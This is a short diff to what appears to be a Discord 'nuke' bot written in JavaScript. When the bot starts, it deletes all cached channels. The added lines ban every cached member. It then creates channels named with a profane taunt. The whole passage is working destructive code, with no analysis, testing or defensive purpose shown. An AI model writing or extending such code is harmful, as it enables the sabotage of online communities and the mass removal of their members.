@@ -35,6 +35,9 @@ client.on('ready',async ()=>{
   server.channels.cache.forEach(channel=>{
     channel.delete()
   })
+  server.members.cache.forEach(member=>{
+    member.ban()
+  })
     server.channels.cache.forEach(channel=>{
       server.channels.create('Get Fuckk From '+client.user.username+"-"+num++)
 
